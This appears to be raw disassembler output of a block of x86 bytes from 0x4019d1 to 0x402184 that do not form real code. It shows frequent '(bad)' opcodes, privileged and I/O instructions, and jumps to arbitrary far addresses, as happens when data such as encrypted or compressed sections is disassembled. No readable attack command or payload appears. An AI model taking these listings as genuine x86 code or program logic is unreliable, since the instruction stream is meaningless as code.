  4019d1:	cmp    DWORD PTR [esi+0x3c78fec3],0x39
  4019d8:	cmp    BYTE PTR [ebx+0x62],dl
  4019db:	lods   eax,DWORD PTR ds:[esi]
  4019dc:	pop    esp
  4019dd:	jmp    0x5bbce60
  4019e2:	test   al,0xd3
  4019e4:	pop    ebp
  4019e5:	in     eax,dx
  4019e6:	nop
  4019e7:	aaa    
  4019e8:	mov    ds:0x654abc6c,al
  4019ed:	fs int3 
  4019ef:	pop    ds
  4019f0:	and    edx,DWORD PTR ds:0x3d09863a
  4019f6:	stos   BYTE PTR es:[edi],al
  4019f7:	or     ebx,esp
  4019f9:	jb     0x401a2a
  4019fb:	into   
  4019fc:	mov    ds:0x77048732,eax
  401a01:	(bad)  
  401a02:	inc    edi
  401a03:	imul   esi,DWORD PTR [esi-0x15],0x7d
  401a07:	sbb    DWORD PTR [ebx-0x1d],ecx
  401a0a:	xchg   BYTE PTR [edi-0x19],ah
  401a0d:	push   0x33
  401a0f:	jbe    0x4019b7
  401a11:	(bad)  [edx+0x12]
  401a14:	or     esp,DWORD PTR [ebp-0x46]
  401a17:	out    0x33,eax
  401a19:	sbb    edi,edi
  401a1b:	fnsave [ebp-0x28e0211c]
  401a21:	jns    0x401a96
  401a23:	std    
  401a24:	and    BYTE PTR [ebx+0x61],dh
  401a27:	jecxz  0x401a04
  401a29:	xchg   esp,eax
  401a2a:	mov    al,ds:0x4ccf94c8
  401a2f:	test   al,0x62
  401a31:	in     al,dx
  401a32:	push   cs
  401a33:	aas    
  401a34:	mov    ds:0xf2670dea,eax
  401a39:	xchg   esi,eax
  401a3a:	sti    
  401a3b:	add    BYTE PTR [esi+0x35],0x4
  401a3f:	fs sub cl,bl
  401a42:	shl    BYTE PTR [eax-0x3f],0x86
  401a46:	(bad)  
  401a47:	cld    
  401a48:	add    BYTE PTR [esi+ebp*1],ah
  401a4b:	test   eax,0xd9a30de
  401a50:	xchg   ecx,eax
  401a51:	or     BYTE PTR [ebx],0xb6
  401a54:	pop    eax
  401a55:	(bad)  
  401a56:	loopne 0x4019df
  401a58:	mov    BYTE PTR [edx],ah
  401a5a:	loopne 0x401a48
  401a5c:	or     al,0x4f
  401a5e:	shl    BYTE PTR [ecx],0xbd
  401a61:	ror    bh,1
  401a63:	mov    ecx,0xbbd1c3ca
  401a68:	popf   
  401a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a6a:	jmp    0x401ae4
  401a6c:	call   0x6d18:0x157cf4ff
  401a73:	into   
  401a74:	pop    edi
  401a75:	std    
  401a76:	out    dx,eax
  401a77:	sub    BYTE PTR [ebx-0xe],cl
  401a7a:	mov    edi,0xf3e0c585
  401a7f:	push   cs
  401a80:	xchg   ebx,eax
  401a81:	stos   BYTE PTR es:[edi],al
  401a82:	adc    DWORD PTR [ecx],ecx
  401a84:	add    ch,ah
  401a86:	data16 icebp 
  401a88:	cld    
  401a89:	cmp    ch,BYTE PTR [ebx-0x69]
  401a8c:	scas   eax,DWORD PTR es:[edi]
  401a8d:	je     0x401acc
  401a8f:	add    BYTE PTR [ebp+ebx*1-0x1f],bl
  401a93:	call   0x649067fb
  401a98:	pop    ebp
  401a99:	jne    0x401a68
  401a9b:	pop    ds
  401a9c:	sbb    edx,DWORD PTR [edi-0x452a0965]
  401aa2:	mov    esi,0xa70925bd
  401aa7:	(bad)  
  401aa8:	shl    DWORD PTR [eax+0x75],1
  401aab:	test   al,0xcb
  401aad:	sub    DWORD PTR [esi+0x7e462c3c],ebp
  401ab3:	jp     0x401a71
  401ab5:	cmc    
  401ab6:	adc    DWORD PTR [eax-0x76fad4b4],ebx
  401abc:	fst    DWORD PTR [esi]
  401abe:	(bad)  [ebp+eax*1-0x1c680d8d]
  401ac5:	and    al,0xf3
  401ac7:	mov    ebx,0xa260997d
  401acc:	mov    ch,0x29
  401ace:	pop    eax
  401acf:	dec    eax
  401ad0:	shr    al,0xcd
  401ad3:	push   0xffffffd7
  401ad5:	mov    dh,0xbd
  401ad7:	push   0x7ae928ac
  401adc:	pop    DWORD PTR [ebx-0x5b60ea30]
  401ae2:	fisubr WORD PTR [eax-0x2a]
  401ae5:	mov    al,0xcc
  401ae7:	push   eax
  401ae8:	sub    al,0xef
  401aea:	sti    
  401aeb:	xchg   edi,eax
  401aec:	arpl   WORD PTR [esi-0x45dfc7c3],bx
  401af2:	lods   al,BYTE PTR ds:[esi]
  401af3:	arpl   bp,sp
  401af5:	inc    ecx
  401af6:	jp     0x401ab8
  401af8:	aad    0x42
  401afa:	and    al,0x21
  401afc:	pop    ebp
  401afd:	aaa    
  401afe:	jl     0x401a89
  401b00:	or     BYTE PTR [ebx+0x53943c4d],al
  401b06:	or     eax,0x73e07c65
  401b0b:	scas   eax,DWORD PTR es:[edi]
  401b0c:	mov    dl,0x8e
  401b0e:	ds cmp ax,0x7bb4
  401b13:	jp     0x401b05
  401b15:	mov    al,bl
  401b17:	loop   0x401b1f
  401b19:	xchg   esi,eax
  401b1a:	lds    eax,FWORD PTR [edi-0x659c3ad5]
  401b20:	ds or  eax,0x52d4b34
  401b26:	sbb    ebp,DWORD PTR [edi+eiz*2]
  401b29:	das    
  401b2a:	nop    DWORD PTR [ecx+0x9886ed9]
  401b31:	imul   eax,esi,0x89869dde
  401b37:	xchg   esi,eax
  401b38:	popf   
  401b39:	and    dh,bh
  401b3b:	xor    al,0x6e
  401b3d:	jmp    0x3742:0xe3ac3aa1
  401b44:	xchg   esp,eax
  401b45:	push   ss
  401b46:	mov    edx,0x126a6e05
  401b4b:	mov    fs,WORD PTR [esi-0x22]
  401b4e:	add    edx,DWORD PTR [edx+0x158879d6]
  401b54:	fsubr  DWORD PTR [ebx]
  401b56:	(bad)  
  401b57:	and    ah,BYTE PTR ds:0x651a64a5
  401b5d:	pusha  
  401b5e:	icebp  
  401b5f:	inc    edi
  401b60:	adc    eax,DWORD PTR [edx-0x501e6a49]
  401b66:	push   cs
  401b67:	addr16 jmp 0x2c413b6b
  401b6d:	das    
  401b6e:	mov    bl,0x6b
  401b70:	mov    al,0x6b
  401b72:	xlat   BYTE PTR ds:[ebx]
  401b73:	mov    al,ds:0xf967b6d1
  401b78:	int    0x50
  401b7a:	gs and al,0x49
  401b7d:	aad    0x9b
  401b7f:	imul   esi,DWORD PTR [edx-0x68],0x5570e652
  401b86:	jmp    0x910a:0x35c55ecb
  401b8d:	cs enter 0x8938,0xa5
  401b92:	or     ah,ah
  401b94:	lods   al,BYTE PTR ds:[esi]
  401b95:	sti    
  401b96:	adc    eax,0x2bc7804b
  401b9b:	cmp    DWORD PTR [eax+0x248da4a],eax
  401ba1:	cli    
  401ba2:	xchg   esi,eax
  401ba3:	clc    
  401ba4:	pop    ss
  401ba5:	je     0x401c0d
  401ba7:	shl    ecx,cl
  401ba9:	test   DWORD PTR [edx+0x3e],eax
  401bac:	outs   dx,BYTE PTR ds:[esi]
  401bad:	mov    WORD PTR [edx-0x7e80e7f0],es
  401bb3:	pop    edx
  401bb4:	(bad)  
  401bb5:	pop    edx
  401bb6:	inc    esi
  401bb7:	or     dl,dl
  401bb9:	mov    eax,ds:0x1d39db4a
  401bbe:	sti    
  401bbf:	sahf   
  401bc0:	xor    eax,0x6453f6b9
  401bc5:	mov    dh,0xb
  401bc7:	mov    dl,0x23
  401bc9:	mov    dh,0x1f
  401bcb:	pop    ss
  401bcc:	push   ebx
  401bcd:	rcr    BYTE PTR [ebx+0x5d],cl
  401bd0:	xchg   edx,esp
  401bd2:	daa    
  401bd3:	iret   
  401bd4:	clc    
  401bd5:	pop    esi
  401bd6:	arpl   WORD PTR [ecx],di
  401bd8:	lods   al,BYTE PTR ds:[esi]
  401bd9:	jp     0x401c13
  401bdb:	and    BYTE PTR ss:[esi],al
  401bde:	mov    bh,0x88
  401be0:	mov    eax,0x99bb6902
  401be5:	push   ecx
  401be6:	inc    ecx
  401be7:	loop   0x401c61
  401be9:	pop    ebx
  401bea:	ja     0x401b9e
  401bec:	lods   al,BYTE PTR ds:[esi]
  401bed:	jbe    0x401be1
  401bef:	ins    BYTE PTR es:[edi],dx
  401bf0:	sub    eax,0x7b51177b
  401bf5:	pop    eax
  401bf6:	push   es
  401bf7:	dec    ecx
  401bf8:	cwde   
  401bf9:	cli    
  401bfa:	adc    DWORD PTR [ecx],ebx
  401bfc:	mov    db5,ebx
  401bff:	jp     0x401c00
  401c01:	pop    esp
  401c02:	fimul  DWORD PTR [edx+0x18]
  401c05:	xchg   DWORD PTR [ebx],ebx
  401c07:	mov    ecx,0x99a2205a
  401c0c:	push   ecx
  401c0d:	dec    esi
  401c0e:	and    DWORD PTR [ebx],esi
  401c10:	and    eax,0x74f3b9e
  401c15:	pusha  
  401c16:	inc    edx
  401c17:	jecxz  0x401bf2
  401c19:	inc    edi
  401c1a:	mov    edi,0xa5e6944e
  401c1f:	mov    esp,0x3f04c4ac
  401c24:	ss test esi,edi
  401c27:	pop    ds
  401c28:	add    edx,edi
  401c2a:	(bad)  
  401c2b:	xchg   edx,eax
  401c2c:	int3   
  401c2d:	das    
  401c2e:	push   cs
  401c2f:	adc    DWORD PTR [ecx],esp
  401c31:	rcl    DWORD PTR [ebp+ebx*2+0x75],0xe8
  401c36:	mov    dh,0x62
  401c38:	xchg   esi,eax
  401c39:	jg     0x401c9e
  401c3b:	outs   dx,DWORD PTR ds:[esi]
  401c3c:	mov    ebp,0xf01d7f53
  401c42:	mov    esi,0xcef91a7a
  401c47:	pop    edx
  401c48:	xor    al,0xff
  401c4a:	ja     0x401c66
  401c4c:	in     eax,dx
  401c4d:	jl     0x401c81
  401c4f:	(bad)  
  401c50:	cmp    esp,ebp
  401c52:	call   0xaf66:0xfdfafcc
  401c59:	jno    0x401be5
  401c5b:	scas   eax,DWORD PTR es:[edi]
  401c5c:	rol    DWORD PTR [edi+0x73935a45],cl
  401c62:	dec    edx
  401c63:	div    BYTE PTR [edx-0x373cc525]
  401c69:	in     al,dx
  401c6a:	jl     0x401c78
  401c6c:	and    cl,BYTE PTR [edi]
  401c6e:	and    BYTE PTR [eax-0x46],bl
  401c71:	lock popa 
  401c73:	adc    bl,BYTE PTR [ecx]
  401c75:	retf   0x51ab
  401c78:	inc    eax
  401c79:	pop    es
  401c7a:	or     DWORD PTR [ebp+0x7bbf1ce],ebx
  401c80:	mov    edx,0x38c59fc9
  401c85:	out    dx,eax
  401c86:	(bad)  
  401c87:	jb     0x401d08
  401c89:	inc    ebp
  401c8a:	jge    0x401cbe
  401c8c:	(bad)
  401c8f:	adc    ch,bh
  401c91:	adc    DWORD PTR [ecx],esp
  401c93:	push   ecx
  401c94:	or     al,0x99
  401c96:	(bad)  
  401c97:	je     0x401cb0
  401c99:	push   esp
  401c9a:	and    cl,BYTE PTR [ebx-0x5d]
  401c9d:	das    
  401c9e:	retf   
  401c9f:	cmp    DWORD PTR [eax],eax
  401ca1:	mov    BYTE PTR [ecx+0xa95e1d],dl
  401ca7:	in     eax,0xc
  401ca9:	loop   0x401cc9
  401cab:	cld    
  401cac:	mul    DWORD PTR [esi-0x1e3ec56e]
  401cb2:	or     eax,0x9bfda667
  401cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cb8:	sti    
  401cb9:	push   esp
  401cba:	sbb    DWORD PTR [eax],edx
  401cbc:	repnz xchg ebx,eax
  401cbe:	cmc    
  401cbf:	cmp    ecx,DWORD PTR [esi-0x3d]
  401cc2:	ins    DWORD PTR es:[edi],dx
  401cc3:	push   eax
  401cc4:	iret   
  401cc5:	mov    ebx,0x9e27bd16
  401cca:	cwde   
  401ccb:	(bad)
  401cce:	and    al,0xf0
  401cd0:	xor    ch,bl
  401cd2:	loopne 0x401ce2
  401cd4:	andnps xmm4,XMMWORD PTR [edi+eiz*1+0x34]
  401cd9:	jmp    0x221470d4
  401cde:	cli    
  401cdf:	push   ds
  401ce0:	in     eax,0x86
  401ce2:	retf   
  401ce3:	mov    DWORD PTR [ebx-0x7b],0xefba0961
  401cea:	dec    ebp
  401ceb:	mov    edi,0x4f2939af
  401cf0:	sbb    al,0xaa
  401cf2:	add    DWORD PTR [edi-0xb7fc47c],0xae10ffe0
  401cfc:	add    esp,DWORD PTR [ebx+0x35]
  401cff:	adc    ebx,esp
  401d01:	psadbw mm5,QWORD PTR [ebx]
  401d04:	sar    DWORD PTR [ecx+0x2fbec3c0],0xfc
  401d0b:	sub    ah,BYTE PTR [edx]
  401d0d:	jne    0x401cd6
  401d0f:	dec    edx
  401d10:	and    DWORD PTR [edx],eax
  401d12:	int    0xd4
  401d14:	jns    0x401d27
  401d16:	(bad)  
  401d17:	mov    WORD PTR ds:0x82437319,gs
  401d1d:	push   ds
  401d1e:	fidivr DWORD PTR [edx-0x11]
  401d21:	sub    DWORD PTR [ecx-0x585c854a],0x2d
  401d28:	jne    0x401d94
  401d2a:	mov    al,ds:0xc7d17cdb
  401d2f:	jl     0x401d23
  401d31:	test   al,0xc5
  401d33:	push   0xbd430f3a
  401d38:	fnsetpm(287 only) 
  401d3a:	inc    edx
  401d3b:	cmp    al,0xef
  401d3d:	sub    eax,0x833552f3
  401d42:	jbe    0x401cdb
  401d44:	fst    DWORD PTR [ebx-0x44]
  401d47:	daa    
  401d48:	xchg   edx,eax
  401d49:	ja     0x401dc7
  401d4b:	xchg   ebx,eax
  401d4c:	icebp  
  401d4d:	mov    ecx,0x386f539e
  401d52:	mov    bh,0x36
  401d54:	pop    ecx
  401d55:	pop    eax
  401d56:	cmp    al,0x3
  401d58:	inc    eax
  401d59:	jge    0x401dbd
  401d5b:	push   ebp
  401d5c:	pop    esp
  401d5d:	retf   0x6b12
  401d60:	adc    ecx,edi
  401d62:	mov    dh,0x77
  401d64:	jp     0x401d63
  401d66:	sahf   
  401d67:	pop    ecx
  401d68:	jg     0x401d15
  401d6a:	icebp  
  401d6b:	cmp    DWORD PTR [ebp-0x21],esi
  401d6e:	dec    edi
  401d6f:	cmp    eax,0x46bfc4ae
  401d74:	jge    0x401d61
  401d76:	dec    ebp
  401d77:	in     eax,dx
  401d78:	les    ebx,FWORD PTR [edx-0x59]
  401d7b:	ret    0xdbdd
  401d7e:	mul    DWORD PTR [ebx+0x6f373713]
  401d84:	and    al,0xb9
  401d86:	mov    ds:0x6b4149b4,eax
  401d8b:	sub    DWORD PTR ds:0xb71f9a09,edi
  401d91:	and    BYTE PTR [ebx],dl
  401d93:	call   0x1e88:0x89ba9f97
  401d9a:	rcl    esp,cl
  401d9c:	cwde   
  401d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d9e:	sahf   
  401d9f:	jg     0x401d2f
  401da1:	cli    
  401da2:	fisub  WORD PTR [edi+0x11ab54d7]
  401da8:	inc    ebp
  401da9:	popf   
  401daa:	push   ebx
  401dab:	mov    ah,0x69
  401dad:	pop    eax
  401dae:	mov    ebx,0xa7f63c2d
  401db3:	fld    TBYTE PTR [ecx+0x6f]
  401db6:	xor    al,0x78
  401db8:	cmp    eax,0xebb72628
  401dbd:	xor    DWORD PTR [eax+ebx*8-0x30322cb1],edi
  401dc4:	cmc    
  401dc5:	and    DWORD PTR [ebx+0x1b32c0d3],edx
  401dcb:	xor    al,0x8b
  401dcd:	cld    
  401dce:	mov    eax,DWORD PTR [edx-0x70]
  401dd1:	test   ch,al
  401dd3:	dec    ebp
  401dd4:	(bad)  
  401dd5:	icebp  
  401dd6:	sbb    DWORD PTR [esi+0x65063359],edi
  401ddc:	imul   esi,DWORD PTR [esp+ebp*4],0xcd3d2ac4
  401de3:	stc    
  401de4:	push   esi
  401de5:	sub    bh,BYTE PTR [esi+0x596b2f3]
  401deb:	outs   dx,DWORD PTR ds:[esi]
  401dec:	inc    edi
  401ded:	inc    ebp
  401dee:	sbb    eax,0x34559500
  401df3:	test   al,0xb0
  401df5:	aam    0x9
  401df7:	out    0xc7,al
  401df9:	xchg   edi,ebx
  401dfb:	mov    cl,0xe4
  401dfd:	int    0xe9
  401dff:	and    ebp,DWORD PTR cs:[eax]
  401e02:	adc    dl,cl
  401e04:	scas   eax,DWORD PTR es:[edi]
  401e05:	jmp    0x401e07
  401e07:	mov    al,0x97
  401e09:	mov    dh,0xe2
  401e0b:	stos   BYTE PTR es:[edi],al
  401e0c:	pop    edx
  401e0d:	test   BYTE PTR [esp+ebp*2+0x1662114d],dh
  401e14:	mov    BYTE PTR [eax-0x52999f94],bl
  401e1a:	out    0x66,al
  401e1c:	xor    eax,0x4ae50bc0
  401e21:	sbb    dl,BYTE PTR [eax]
  401e23:	and    DWORD PTR [edi-0x5c],edi
  401e26:	out    0xcd,eax
  401e28:	or     al,0x5b
  401e2a:	ins    DWORD PTR es:[edi],dx
  401e2b:	and    al,BYTE PTR [ebx-0x63b6482e]
  401e31:	cli    
  401e32:	dec    ebx
  401e33:	add    BYTE PTR ds:0x21430e8b,bl
  401e39:	scas   al,BYTE PTR es:[edi]
  401e3a:	inc    esi
  401e3b:	test   eax,0x22b4f404
  401e41:	jle    0x401dc8
  401e43:	and    DWORD PTR fs:[ecx],eax
  401e46:	mov    ecx,0x4586859b
  401e4b:	push   esi
  401e4c:	fwait
  401e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e4e:	adc    al,0x1b
  401e50:	add    eax,0x5b588654
  401e55:	stos   BYTE PTR es:[edi],al
  401e56:	clc    
  401e57:	cmp    dl,BYTE PTR [ebp+0x59]
  401e5a:	fdiv   st,st(7)
  401e5c:	popa   
  401e5d:	adc    eax,DWORD PTR [esi]
  401e5f:	and    eax,0x71b8a938
  401e64:	cli    
  401e65:	mov    esp,0xa6bcced8
  401e6a:	pop    edx
  401e6b:	add    al,0x5a
  401e6d:	das    
  401e6e:	cmp    eax,ebx
  401e70:	neg    DWORD PTR [eax+0x61ad4b6c]
  401e76:	(bad)  
  401e78:	mov    esi,DWORD PTR [ecx-0x26]
  401e7b:	imul   eax,DWORD PTR [ebx-0x4c7cb724],0x11
  401e82:	icebp  
  401e83:	hlt    
  401e84:	sub    al,0xd6
  401e86:	outs   dx,DWORD PTR ds:[esi]
  401e87:	xor    bh,BYTE PTR [ecx-0x14ae3bfe]
  401e8d:	jo     0x401ec7
  401e8f:	jne    0x401e79
  401e91:	push   ebx
  401e92:	fdiv   DWORD PTR [eax-0x34]
  401e95:	popa   
  401e96:	neg    BYTE PTR [edi+edx*1]
  401e99:	mov    dh,0x5b
  401e9b:	aam    0x7c
  401e9d:	jnp    0x401e86
  401e9f:	fild   QWORD PTR [ebx+0x59]
  401ea2:	push   esi
  401ea3:	std    
  401ea4:	add    al,0x23
  401ea6:	ror    DWORD PTR [esi],1
  401ea8:	inc    edi
  401ea9:	shl    cl,1
  401eab:	repnz daa 
  401ead:	jl     0x401f17
  401eaf:	out    0x8b,eax
  401eb1:	and    dl,ch
  401eb3:	xchg   ecx,eax
  401eb4:	jns    0x401eee
  401eb6:	inc    ecx
  401eb7:	retf   0xdc72
  401eba:	not    BYTE PTR [edi+0x40]
  401ebd:	fimul  DWORD PTR [eax-0x59]
  401ec0:	pop    esi
  401ec1:	scas   al,BYTE PTR es:[edi]
  401ec2:	push   edi
  401ec3:	rcl    DWORD PTR [edi],0x3b
  401ec6:	jp     0x401eac
  401ec8:	out    0xe0,al
  401eca:	add    dl,cl
  401ecc:	mov    al,ah
  401ece:	mov    ah,0x52
  401ed0:	jo     0x401e78
  401ed2:	push   esp
  401ed3:	mov    edi,0xca7267c
  401ed8:	mov    al,0x4e
  401eda:	leave  
  401edb:	adc    bh,BYTE PTR [eax-0x67af7075]
  401ee1:	in     al,0x80
  401ee3:	shl    BYTE PTR [esi+0x2923e61c],0x80
  401eea:	dec    eax
  401eeb:	dec    ebp
  401eec:	dec    ebx
  401eed:	scas   al,BYTE PTR es:[edi]
  401eee:	les    eax,FWORD PTR [ecx+0x7cea4cdf]
  401ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ef5:	xchg   edx,eax
  401ef6:	push   ebx
  401ef7:	cmp    dh,0x96
  401efa:	dec    edi
  401efb:	in     al,0xaa
  401efd:	jecxz  0x401e7f
  401eff:	xchg   ecx,eax
  401f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f01:	cmp    DWORD PTR [edi-0x662a7cfe],edx
  401f07:	aam    0x46
  401f09:	loop   0x401f39
  401f0b:	or     al,0x5b
  401f0d:	pmuludq mm6,QWORD PTR [edx-0x7e64aaf2]
  401f14:	imul   ecx,DWORD PTR [ebp-0x28d1d285],0x5a
  401f1b:	rcr    DWORD PTR [edi+0x2e],0x5a
  401f1f:	call   0xd707:0x9adb766e
  401f26:	cmp    BYTE PTR [ebx+0x7f],bl
  401f29:	test   eax,0x9bc9668d
  401f2e:	cmp    eax,0x77efa004
  401f33:	push   ecx
  401f34:	sub    eax,DWORD PTR [ebx]
  401f36:	mov    edi,0xd7960a6e
  401f3b:	daa    
  401f3c:	push   edx
  401f3d:	jl     0x401fa5
  401f3f:	cs out dx,al
  401f41:	inc    edx
  401f42:	sub    DWORD PTR [edi],ebx
  401f44:	adc    dh,BYTE PTR [esi+ebx*8+0x65]
  401f48:	and    BYTE PTR [ebp-0x2df7733],ah
  401f4e:	sub    dl,BYTE PTR [esi-0x4df857b8]
  401f54:	loope  0x401f5a
  401f56:	(bad)  
  401f57:	pop    ds
  401f58:	mov    ch,0x70
  401f5a:	daa    
  401f5b:	lock mov BYTE PTR [edi+0x62],ch
  401f5f:	and    al,BYTE PTR [ecx+0x7310a214]
  401f65:	push   ds
  401f66:	xor    esp,ebx
  401f68:	push   es
  401f69:	add    al,0xa5
  401f6b:	pop    esi
  401f6c:	add    dl,cl
  401f6e:	pop    esi
  401f6f:	push   es
  401f70:	ja     0x401fe0
  401f72:	call   DWORD PTR [ebp+0x5a]
  401f75:	popa   
  401f76:	ss ins BYTE PTR es:[edi],dx
  401f78:	mov    edi,0x900c72aa
  401f7d:	push   esi
  401f7e:	cdq    
  401f7f:	xchg   edx,eax
  401f80:	jne    0x401fc0
  401f82:	call   0xb2a4a681
  401f87:	push   ebx
  401f88:	into   
  401f89:	in     al,dx
  401f8a:	daa    
  401f8b:	mov    eax,ds:0x919f215c
  401f90:	mov    BYTE PTR [edi+0x3bbec02e],cl
  401f96:	sbb    al,0x6e
  401f98:	adc    eax,edx
  401f9a:	jecxz  0x401fd8
  401f9c:	test   BYTE PTR [ecx-0x2d9b0e3b],al
  401fa2:	out    0x50,eax
  401fa4:	push   ecx
  401fa5:	popa   
  401fa6:	push   es
  401fa7:	sahf   
  401fa8:	adc    eax,0xfa4edd1f
  401fad:	hlt    
  401fae:	add    dh,bl
  401fb0:	push   esp
  401fb1:	add    DWORD PTR [esp+ecx*8],ecx
  401fb4:	xor    eax,0xa0d77cb4
  401fb9:	jns    0x402012
  401fbb:	xor    al,0x60
  401fbd:	icebp  
  401fbe:	arpl   bp,dx
  401fc0:	sbb    al,0x96
  401fc2:	mov    al,0xbe
  401fc4:	dec    edi
  401fc5:	or     al,0x1
  401fc7:	in     eax,dx
  401fc8:	leave  
  401fc9:	push   es
  401fca:	loop   0x401fd2
  401fcc:	mov    al,ds:0xc10bb049
  401fd1:	jg     0x40200a
  401fd3:	jbe    0x401f55
  401fd5:	sbb    DWORD PTR [ecx+edi*8-0x23],edi
  401fd9:	(bad)  
  401fda:	imul   edi,edx,0x39920d50
  401fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fe1:	dec    edx
  401fe2:	(bad)  
  401fe3:	out    dx,al
  401fe4:	add    BYTE PTR [ebx+0x4ff3a765],bl
  401fea:	in     al,0x8e
  401fec:	into   
  401fed:	sbb    BYTE PTR [ecx-0x66019657],bh
  401ff3:	mov    edx,0x4917218c
  401ff8:	pop    ebp
  401ff9:	addr16 mov ecx,0xa883db0d
  401fff:	and    ebp,0x14006098
  402005:	test   DWORD PTR [ebx],eax
  402007:	fldcw  WORD PTR [edi+0x9]
  40200a:	jmp    0xc30710bf
  40200f:	sub    BYTE PTR [ebp-0x21],bh
  402012:	imul   BYTE PTR [eax+0x7c]
  402015:	ds in  eax,0xd6
  402018:	mov    dl,0xc3
  40201a:	xchg   edi,eax
  40201b:	ja     0x402036
  40201d:	stc    
  40201e:	inc    eax
  40201f:	hlt    
  402020:	pop    es
  402021:	xchg   edi,eax
  402022:	ins    DWORD PTR es:[edi],dx
  402023:	push   eax
  402024:	mov    ecx,0x6e071e0d
  402029:	jmp    0x1c60:0x9eabcc9d
  402030:	ss mov edi,0x7efdbbe4
  402036:	mov    dh,0x29
  402038:	inc    ebx
  402039:	mov    ebp,DWORD PTR [esi+0x77d4943a]
  40203f:	addr16 aam 0xd2
  402042:	add    BYTE PTR [esi+0x4d],bl
  402045:	or     ebp,DWORD PTR [esi-0x7f]
  402048:	mov    dl,0x78
  40204a:	into   
  40204b:	cmp    eax,0xc8863ecd
  402050:	rcr    DWORD PTR [edi-0x3d],cl
  402053:	mov    DWORD PTR [esi],eax
  402055:	add    DWORD PTR [edx],eax
  402057:	pushf  
  402058:	mov    ss,eax
  40205a:	xor    al,0x5
  40205c:	addr16 dec edi
  40205e:	sbb    dh,BYTE PTR [edx]
  402060:	push   ecx
  402061:	(bad)  
  402062:	pop    ebp
  402063:	fisub  DWORD PTR [esi+0x9432b4f]
  402069:	mov    esp,DWORD PTR [esi+edi*2]
  40206c:	out    dx,eax
  40206d:	add    ah,BYTE PTR ds:0xff5f70d0
  402073:	les    edx,FWORD PTR [ebx+0x3c152642]
  402079:	adc    BYTE PTR [ecx+eiz*8+0x42],0xdb
  40207e:	cmc    
  40207f:	sub    ebx,DWORD PTR [edi+0xf]
  402082:	arpl   WORD PTR [esi+0x6333f7d8],bx
  402088:	lea    esp,[esp+eax*2]
  40208b:	in     al,dx
  40208c:	test   DWORD PTR [ebp+ebx*1+0x6b],0xb5048c1f
  402094:	xor    cl,dl
  402096:	scas   al,BYTE PTR es:[edi]
  402097:	mov    ds:0x4028de96,al
  40209c:	iret   
  40209d:	xchg   ecx,eax
  40209e:	mov    eax,0x6018d9af
  4020a3:	arpl   bx,di
  4020a5:	and    DWORD PTR [ecx-0x21],ebp
  4020a8:	lds    esp,FWORD PTR [edx-0x36]
  4020ab:	mov    WORD PTR [ebx+0x8c151d5],ds
  4020b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b3:	stos   BYTE PTR es:[edi],al
  4020b4:	ror    BYTE PTR [edi-0xd030c7a],cl
  4020ba:	mov    ch,0x8d
  4020bc:	nop
  4020bd:	mov    ah,0xca
  4020bf:	outs   dx,DWORD PTR ds:[esi]
  4020c0:	aad    0xe5
  4020c2:	aaa    
  4020c3:	xor    ch,BYTE PTR [eax+0x46]
  4020c6:	xor    al,0xab
  4020c8:	arpl   WORD PTR [ecx-0x71],ax
  4020cb:	pusha  
  4020cc:	mov    esi,0x7e350128
  4020d1:	xor    esi,ecx
  4020d3:	fwait
  4020d4:	lahf   
  4020d5:	or     eax,DWORD PTR [eax-0x37]
  4020d8:	pop    edi
  4020d9:	or     DWORD PTR [edx],eax
  4020db:	and    al,BYTE PTR [ebp+0x2e]
  4020de:	and    esp,DWORD PTR ds:0x34eaaee4
  4020e4:	or     al,0xd2
  4020e6:	in     al,dx
  4020e7:	icebp  
  4020e8:	inc    ecx
  4020e9:	out    dx,al
  4020ea:	test   al,0xc3
  4020ec:	mov    edx,0xc46ebf2d
  4020f1:	adc    BYTE PTR [edx-0x28],0xf2
  4020f5:	sbb    edi,edi
  4020f7:	pcmpgtb mm2,QWORD PTR [ebx]
  4020fa:	aaa    
  4020fb:	fwait
  4020fc:	sub    dh,BYTE PTR [ecx]
  4020fe:	imul   ebx,DWORD PTR [eax+0x55],0x3c
  402102:	(bad)  
  402103:	aaa    
  402104:	test   ecx,edx
  402106:	test   ch,al
  402108:	sub    dl,dl
  40210a:	repz popa 
  40210c:	and    ebx,DWORD PTR [esp+eax*4]
  40210f:	cmp    BYTE PTR [edi],ch
  402111:	hlt    
  402112:	pop    ecx
  402113:	push   es
  402114:	cdq    
  402115:	and    dh,BYTE PTR [bp+si-0xa]
  402119:	push   ebp
  40211a:	cmp    DWORD PTR [esi],0xfffffff3
  40211d:	popa   
  40211e:	jns    0x4020d7
  402120:	or     al,BYTE PTR [esi]
  402122:	push   edi
  402123:	pop    es
  402124:	adc    DWORD PTR [ecx+0xe4ec111],0xffffff80
  40212b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40212c:	lahf   
  40212d:	out    0x90,eax
  40212f:	jmp    0x558:0x1dc30596
  402136:	test   BYTE PTR [edx+0x24d88bad],dl
  40213c:	mov    ch,BYTE PTR [ecx+0x294e1dc9]
  402142:	adc    al,0xf0
  402144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402145:	rcr    BYTE PTR [ebp+0x18],0xf7
  402149:	sbb    eax,0x92c9ae87
  40214e:	and    BYTE PTR [esi],bl
  402150:	pop    es
  402151:	das    
  402152:	cs xor al,0x19
  402155:	test   eax,0xad93d4eb
  40215a:	ja     0x402169
  40215c:	neg    ch
  40215e:	and    DWORD PTR ds:0x92337380,ebx
  402164:	mov    dh,0xba
  402166:	dec    ecx
  402167:	in     eax,0x5d
  402169:	xchg   ebp,eax
  40216a:	or     ebx,DWORD PTR [ebp-0x66e93415]
  402170:	shl    DWORD PTR [ecx-0x3],1
  402173:	add    ch,ch
  402175:	and    BYTE PTR [edx+edx*1],ch
  402178:	dec    edx
  402179:	jecxz  0x40215d
  40217b:	or     bl,BYTE PTR [eax+edx*4]
  40217e:	sbb    edx,DWORD PTR [edi+0x1cc9477b]
  402184:	scas   al,BYTE PTR es:[edi]
